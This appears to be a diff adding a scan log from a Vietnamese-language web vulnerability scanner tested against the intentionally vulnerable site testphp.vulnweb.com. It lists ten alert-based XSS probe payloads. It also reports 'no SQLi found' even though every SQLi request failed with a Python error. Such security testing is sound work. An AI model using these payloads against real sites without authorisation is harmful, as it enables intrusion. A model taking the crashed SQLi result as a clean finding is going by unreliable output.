@@ -1,0 +1,57 @@
+[TIME] 2025-08-23 02:51:17
+[URL] http://testphp.vulnweb.com/artists.php?artist=
+[SUMMARY] XSS
+======= SQLi =======
+[*] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[!] Lỗi khi gửi request: name 'time' is not defined
+[✓] Không phát hiện lỗ hổng SQLi.
+
+
+======= XSS =======
+[*] Đang kiểm tra XSS trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] Có thể bị tấn công XSS với các payloads:
+    - <img src="cat.webp" onmouseover="alert('meomeo')" width=100%/>
+    - "><svg onmouseover=alert(4)>
+    - <video src=1 onerror=alert(9)>
+    - <marquee onstart=alert(8)>
+    - <iframe src="javascript:alert(5)">
+    - '><svg/onload=alert(3)>
+    - "><img src=x onerror=alert(2)>
+    - <math href="javascript:alert(6)">
+    - <details open ontoggle=alert(7)>
+    - <script>alert(1)</script>
+
+
+
+======= CMDi =======
+[*] Đang kiểm tra Command Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[✓] Không phát hiện lỗ hổng CMDi.
+
+
+======= XXE =======
+[*] Đang kiểm tra XXE trên: http://testphp.vulnweb.com/artists.php?artist=
+[✓] Không phát hiện lỗ hổng XXE.
+
+
